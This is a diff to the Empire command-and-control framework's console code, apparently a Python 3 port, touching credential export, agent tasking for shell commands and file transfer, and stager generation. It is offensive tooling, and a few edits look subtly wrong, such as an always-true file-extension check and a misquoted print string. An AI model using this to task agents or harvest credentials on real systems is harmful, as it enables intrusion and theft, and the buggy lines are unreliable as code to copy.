@@ -14,7 +14,8 @@ from __future__ import absolute_import
 from builtins import input
 from builtins import str
 from builtins import range
-VERSION = "3.0 BC-Security Fork"
+
+VERSION = "3.0.7 BC-Security Fork"
 
 from pydispatch import dispatcher
 
@@ -274,7 +275,6 @@ class MainMenu(cmd.Cmd):
                             
                             # generate the stager
                             menu.do_generate('')
-                            print('empire.py: line 277')
                         else:
                             messages.display_stager(targetStager)
                     
@@ -684,7 +684,7 @@ class MainMenu(cmd.Cmd):
         
         else:
             creds = self.credentials.get_credentials(filterTerm=filterTerm)
-        
+
         messages.display_credentials(creds)
     
     
@@ -959,26 +959,37 @@ class MainMenu(cmd.Cmd):
             f = open('data/credentials.csv','w')
             f.write('Domain, Username, Host, Cred Type, Password\n')
             for row in rows:
+                row = list(row)
+                for n in range(len(row)):
+                    if isinstance(row[n], bytes):
+                        row[n] = row[n].decode('UTF-8')
                 f.write(row[0]+ ','+ row[1]+ ','+ row[2]+ ','+ row[3]+ ','+ row[4]+'\n')
             f.close()
             
             # Empire Log
             cur.execute("""
             SELECT
-                reporting.time_stamp
-                ,reporting.event_type
-                ,reporting.name as "AGENT_ID"
-                ,a.hostname
-                ,reporting.taskID
-                ,t.data AS "Task"
-                ,r.data AS "Results"
+                time_stamp,
+                event_type,
+                substr(reporting.name, pos+1) as agent_name,
+                a.hostname,
+                taskID,
+                t.data as "Task",
+                r.data as "Results"
             FROM
-                reporting
-                JOIN agents a on reporting.name = a.session_id
-                LEFT OUTER JOIN taskings t on (reporting.taskID = t.id) AND (reporting.name = t.agent)
-                LEFT OUTER JOIN results r on (reporting.taskID = r.id) AND (reporting.name = r.agent)
-            WHERE
-                reporting.event_type == 'task' OR reporting.event_type == 'checkin'
+            (
+                SELECT
+                    time_stamp,
+                    event_type,
+                    name,
+                    instr(name, '/') as pos,
+                    taskID
+                FROM reporting
+                WHERE name LIKE 'agent%'
+                AND reporting.event_type == 'task' OR reporting.event_type == 'checkin') reporting
+            LEFT OUTER JOIN taskings t on (reporting.taskID = t.id) AND (agent_name = t.agent)
+            LEFT OUTER JOIN results r on (reporting.taskID = r.id) AND (agent_name = r.agent)
+            JOIN agents a on agent_name = a.session_id
             """)
             rows = cur.fetchall()
             print(helpers.color("[*] Writing data/master.log"))
@@ -986,6 +997,10 @@ class MainMenu(cmd.Cmd):
             f.write('Empire Master Taskings & Results Log by timestamp\n')
             f.write('='*50 + '\n\n')
             for row in rows:
+                row = list(row)
+                for n in range(len(row)):
+                    if isinstance(row[n], bytes):
+                        row[n] = row[n].decode('UTF-8')
                 f.write('\n' + row[0] + ' - ' + row[3] + ' (' + row[2] + ')> ' + str(row[5]) + '\n' + str(row[6]) + '\n')
             f.close()
             cur.close()
@@ -1139,8 +1154,7 @@ class SubMenu(cmd.Cmd):
     
     def emptyline(self):
         pass
-    
-    
+
     def postcmd(self, stop, line):
         if line == "back":
             return True
@@ -1149,8 +1163,7 @@ class SubMenu(cmd.Cmd):
             if nextcmd == "lastautoruncmd":
                 raise Exception("endautorun")
             self.cmdqueue.append(nextcmd)
-    
-    
+
     def do_back(self, line):
         "Go back a menu."
         return True
@@ -1858,7 +1871,7 @@ class PowerShellAgentMenu(SubMenu):
         if '{} returned results'.format(self.sessionID) in signal:
             results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
             if results:
-                print(helpers.color(results))
+                print("\n" + helpers.color(results))
     
     
     def default(self, line):
@@ -2202,7 +2215,7 @@ class PowerShellAgentMenu(SubMenu):
     
     
     def do_download(self, line):
-        "Task an agent to download a file."
+        "Task an agent to download a file into the C2."
         
         line = line.strip()
         
@@ -2223,7 +2236,7 @@ class PowerShellAgentMenu(SubMenu):
     
     
     def do_upload(self, line):
-        "Task an agent to upload a file."
+        "Task the C2 to upload a file into an agent."
         
         # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
         # absolute paths accepted
@@ -2237,21 +2250,23 @@ class PowerShellAgentMenu(SubMenu):
             else:
                 # if we're uploading the file as a different name
                 uploadname = parts[1].strip()
-            
             if parts[0] != "" and os.path.exists(parts[0]):
                 # Check the file size against the upload limit of 1 mb
                 
                 # read in the file and base64 encode it for transport
-                open_file = open(parts[0], 'r')
+                open_file = open(parts[0], 'rb')
                 file_data = open_file.read()
+
                 open_file.close()
-                
                 size = os.path.getsize(parts[0])
+
                 if size > 1048576:
                     print(helpers.color("[!] File size is too large. Upload limit is 1MB."))
                 else:
                     # dispatch this event
                     message = "[*] Tasked agent to upload {}, {}".format(uploadname, helpers.get_file_size(file_data))
+                    file_data = file_data
+
                     signal = json.dumps({
                         'print': True,
                         'message': message,
@@ -2267,7 +2282,7 @@ class PowerShellAgentMenu(SubMenu):
                     
                     # upload packets -> "filename | script data"
                     file_data = helpers.encode_base64(file_data)
-                    data = uploadname + "|" + file_data
+                    data = uploadname + "|" + file_data.decode("latin-1")
                     self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPLOAD", data)
             else:
                 print(helpers.color("[!] Please enter a valid file path to upload"))
@@ -2290,17 +2305,17 @@ class PowerShellAgentMenu(SubMenu):
             self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_IMPORT", script_data)
             
             # dispatch this event
-            message = "[*] Tasked agent to import {}: {}".format(path, hashlib.md5(script_data).hexdigest())
+            message = "[*] Tasked agent to import {}: {}".format(path, hashlib.md5(script_data.encode('utf-8')).hexdigest())
             signal = json.dumps({
                 'print': False,
                 'message': message,
                 'import_path': path,
-                'import_md5': hashlib.md5(script_data).hexdigest()
+                'import_md5': hashlib.md5(script_data.encode('utf-8')).hexdigest()
             })
             dispatcher.send(signal, sender="agents/{}".format(self.sessionID))
             
             # update the agent log with the filename and MD5
-            msg = "Tasked agent to import %s : %s" % (path, hashlib.md5(script_data).hexdigest())
+            msg = "Tasked agent to import %s : %s" % (path, hashlib.md5(script_data.encode('utf-8')).hexdigest())
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
             
             # extract the functions from the script so we can tab-complete them
@@ -2834,26 +2849,38 @@ class PythonAgentMenu(SubMenu):
         if '{} returned results'.format(self.sessionID) in signal:
             results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
             if results:
-                print(helpers.color(results))
-    
+                print("\n" + helpers.color(results))
+
     def default(self, line):
         "Default handler"
+
         line = line.strip()
         parts = line.split(' ')
-        
+
         if len(parts) > 0:
             # check if we got an agent command
             if parts[0] in self.agentCommands:
                 shellcmd = ' '.join(parts)
                 # task the agent with this shell command
                 self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", shellcmd)
+
+                # dispatch this event
+                message = "[*] Tasked agent to run command {}".format(line)
+                signal = json.dumps({
+                    'print': False,
+                    'message': message,
+                    'command': line
+                })
+                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))
+
                 # update the agent log
                 msg = "Tasked agent to run command " + line
                 self.mainMenu.agents.save_agent_log(self.sessionID, msg)
             else:
                 print(helpers.color("[!] Command not recognized."))
                 print(helpers.color("[*] Use 'help' or 'help agentcmds' to see available commands."))
-    
+
+
     def do_help(self, *args):
         "Displays the help menu or syntax for particular commands."
         SubMenu.do_help(self, *args)
@@ -2928,15 +2955,14 @@ class PythonAgentMenu(SubMenu):
         "Change an agent's active directory"
         
         line = line.strip()
-        
         if line != "":
             # have to be careful with inline python and no threading
             # this can cause the agent to crash so we will use try / cath
             # task the agent with this shell command
             if line == "..":
-                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir(os.pardir); print "Directory stepped down: %s"' % (line))
+                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir(os.pardir); print("Directory stepped down: %s")' % (line))
             else:
-                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir("%s"); print "Directory changed to: %s"' % (line, line))
+                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir("%s"); print("Directory changed to: %s)"' % (line, line))
             
             # dispatch this event
             message = "[*] Tasked agent to change active directory to {}".format(line)
@@ -3011,7 +3037,7 @@ class PythonAgentMenu(SubMenu):
         
         if delay == "":
             # task the agent to display the delay/jitter
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; print 'delay/jitter = ' + str(delay)+'/'+str(jitter)")
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; print('delay/jitter = ' + str(delay)+'/'+str(jitter))")
             
             # dispatch this event
             message = "[*] Tasked agent to display delay/jitter"
@@ -3033,7 +3059,7 @@ class PythonAgentMenu(SubMenu):
             self.mainMenu.agents.set_agent_field_db("delay", delay, self.sessionID)
             self.mainMenu.agents.set_agent_field_db("jitter", jitter, self.sessionID)
             
-            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print('delay/jitter set to %s/%s')" % (delay, jitter, delay, jitter))
             
             # dispatch this event
             message = "[*] Tasked agent to delay sleep/jitter {}/{}".format(delay, jitter)
@@ -3170,7 +3196,6 @@ class PythonAgentMenu(SubMenu):
         "Task an agent to use a shell command."
         
         line = line.strip()
-        
         if line != "":
             # task the agent with this shell command
             self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", str(line))
@@ -3261,7 +3286,7 @@ class PythonAgentMenu(SubMenu):
     
     
     def do_download(self, line):
-        "Task an agent to download a file."
+        "Task an agent to download a file into the C2."
         
         line = line.strip()
         
@@ -3283,7 +3308,7 @@ class PythonAgentMenu(SubMenu):
     
     
     def do_upload(self, line):
-        "Task an agent to upload a file."
+        "Task the C2 to upload a file into an agent."
         
         # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
         # absolute paths accepted
@@ -3302,7 +3327,7 @@ class PythonAgentMenu(SubMenu):
                 # TODO: reimplement Python file upload
                 
                 # # read in the file and base64 encode it for transport
-                f = open(parts[0], 'r')
+                f = open(parts[0], 'rb')
                 fileData = f.read()
                 f.close()
                 # Get file size
@@ -3325,6 +3350,8 @@ class PythonAgentMenu(SubMenu):
                     # get final file size
                     fileData = helpers.encode_base64(fileData)
                     # upload packets -> "filename | script data"
+                    if isinstance(fileData, bytes):
+                        fileData = fileData.decode("utf-8")
                     data = uploadname + "|" + fileData
                     
                     # dispatch this event
@@ -4457,7 +4484,7 @@ class StagerMenu(SubMenu):
         "Generate/execute the given Empire stager."
         if not self.validate_options():
             return
-        
+
         stagerOutput = self.stager.generate()
         
         savePath = ''
@@ -4470,13 +4497,19 @@ class StagerMenu(SubMenu):
                 os.makedirs(os.path.dirname(savePath))
             
             # if we need to write binary output for a .dll
-            if ".dll" in savePath:
+            if ".dll" or ".bin" in savePath:
                 out_file = open(savePath, 'wb')
-                out_file.write(bytearray(stagerOutput))
+                if isinstance(stagerOutput, str):
+                    stagerOutput = stagerOutput.encode('UTF-8')
+                out_file.write(stagerOutput)
                 out_file.close()
             else:
                 # otherwise normal output
                 out_file = open(savePath, 'w')
+
+                if isinstance(stagerOutput, bytes):
+                    stagerOutput = stagerOutput.decode('latin-1')
+
                 out_file.write(stagerOutput)
                 out_file.close()
             
